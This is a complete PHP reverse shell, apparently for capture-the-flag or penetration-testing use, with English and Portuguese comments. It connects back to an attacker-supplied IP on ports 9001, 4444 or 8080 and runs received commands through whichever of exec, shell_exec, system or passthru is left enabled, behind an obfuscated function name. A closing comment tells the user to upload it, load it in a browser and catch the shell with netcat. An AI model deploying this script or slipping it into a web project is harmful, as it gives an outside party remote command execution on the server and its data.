<?php
$ipaddr = ""; // Your IP --- seu IP tun0
$ports  = array(9001, 4444, 8080); //Ports --- portas 

function wjfzHmO($c){
  $dis = @ini_get("disable_functions");
  $dis = explode(",", $dis);
  $dis = array_map("trim", $dis);

  if (is_callable("exec") and !in_array("exec", $dis)) {
    exec($c, $o);
    $o = join("\n", $o);
  } else if (is_callable("shell_exec") and !in_array("shell_exec", $dis)) {
    $o = shell_exec($c);
  } else if (is_callable("system") and !in_array("system", $dis)) {
    ob_start();
    system($c);
    $o = ob_get_contents();
    ob_end_clean();
  } else if (is_callable("passthru") and !in_array("passthru", $dis)) {
    ob_start();
    passthru($c);
    $o = ob_get_contents();
    ob_end_clean();
  } else {
    $o = 0;
  }
  return $o;
}

$nofuncs = 'no exec functions';

foreach ($ports as $port) {
  if (is_callable("fsockopen") and !in_array("fsockopen", $dis)) {
    $s = @fsockopen("tcp://".$ipaddr, $port);
    if ($s) {
      while ($c = fread($s, 2048)) {
        $out = '';
        if (substr($c,0,3) == 'cd ') {
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        } else {
          $out = wjfzHmO(substr($c,0,-1));
          if ($out === false) {
            fwrite($s, $nofuncs);
            break;
          }
        }
        fwrite($s, $out);
      }
      fclose($s);
      break; // Throw the link on the web, run the code using netcat to access it.. joga o link no navegador o link, e roda o codigo usando netcat.
    }
  }
}
?>
